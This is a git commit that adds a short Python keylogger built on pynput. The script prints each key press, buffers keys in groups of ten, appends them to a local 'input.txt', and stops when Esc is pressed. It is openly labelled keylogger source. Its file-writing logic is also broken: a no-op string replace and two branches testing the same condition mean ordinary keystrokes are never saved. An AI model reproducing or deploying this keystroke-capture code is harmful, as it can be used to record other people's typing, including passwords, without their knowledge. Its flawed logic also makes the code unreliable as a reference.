c04bb749031fd6db316bd7fe82f0e8b0cbdf672e
Prashi Doval <prashidoval23@gmail.com>
2019-11-13 06:05:06 +0530

    Create keylogger.py

---
+++ Keylogger/keylogger.py
@@ -0,0 +1,33 @@
+import pynput
+from pynput.keyboard import Key, Listener
+count = 0
+keys = []
+
+def on_press(key):
+    global keys, count
+
+    keys.append(key)
+    count += 1
+    print("{0} pressed".format(key))
+
+    if count >= 10:
+        count = 0
+        write_file(keys)
+        keys = []
+
+def write_file(keys):
+    with open("input.txt", "a") as f:
+        for key in keys:
+            k = str(key).replace("", "")
+            if k.find("space") > 0:
+                f.write('\n')
+            elif k.find("space") > 0:
+                f.write(k)
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
